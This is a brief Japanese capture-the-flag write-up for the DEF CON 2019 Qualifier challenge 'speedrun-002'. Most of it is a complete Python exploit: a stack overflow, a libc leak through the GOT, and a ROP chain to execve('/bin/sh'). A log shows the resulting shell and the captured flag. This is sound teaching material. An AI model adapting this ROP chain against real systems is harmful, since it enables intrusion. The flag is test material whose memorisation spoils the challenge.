# [pwn 5pts] speedrun-002 - DEF CON CTF 2019 Qualifier
64ビットでPIEやSSPが無効です。
```
$ checksec -f speedrun-002
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable  FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols      No	0		1	speedrun-002
```
speedrun-001と同じですが、dynamic linkになっています。
GOTからlibc baseを計算して、ROPを構成します。
```python
from ptrlib import *
from time import sleep

elfpath = "./speedrun-002"

libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
elf = ELF(elfpath)
sock = Socket("speedrun-002.quals2019.oooverflow.io", 31337)
#sock = Process(elfpath)

plt_read = 0x4005e0
plt_puts = 0x4005b0

rop_pop_rdi = 0x004008a3
rop_pop_rsi_r15 = 0x004008a1
rop_pop_rdx = 0x004006ec

sock.send("Everything intelligent is so boring.")
sock.recvuntil("thing to say.")

payload = b'A' * 0x408
payload += p64(rop_pop_rdi)
payload += p64(elf.got("puts"))
payload += p64(plt_puts)
payload += p64(0x400600)
payload += p64(0xffffffffffffffdd)
sock.sendline(payload)

sock.recvline()
sock.recvline()
sock.recvline()
addr_puts = u64(sock.recvline().rstrip())
libc_base = addr_puts - libc.symbol("puts")
dump("libc base = " + hex(libc_base))

sock.recvuntil("What say you now?")
sock.send("Everything intelligent is so boring.")
sock.recvuntil("thing to say.")

rop_pop_rax = libc_base + 0x000439c7
rop_syscall = libc_base + 0x000d2975

payload = b'A' * 0x408
payload += p64(rop_pop_rdi)
payload += p64(libc_base + next(libc.find("/bin/sh")))
payload += p64(rop_pop_rsi_r15)
payload += p64(0)
payload += p64(0)
payload += p64(rop_pop_rdx)
payload += p64(0)
payload += p64(rop_pop_rax)
payload += p64(59)
payload += p64(rop_syscall)
sock.sendline(payload)

sock.interactive()
```

```
$ python solve.py 
[+] Socket: Successfully connected to speedrun-002.quals2019.oooverflow.io:31337
[ptrlib] libc base = 0x7fc085244000
[ptrlib]$ 
Tell me more.
Fascinating.
cat flag
[ptrlib]$ OOO{I_didn't know p1zzA places__mAde pwners.}
```

# 感想
初心者向けの問題です。
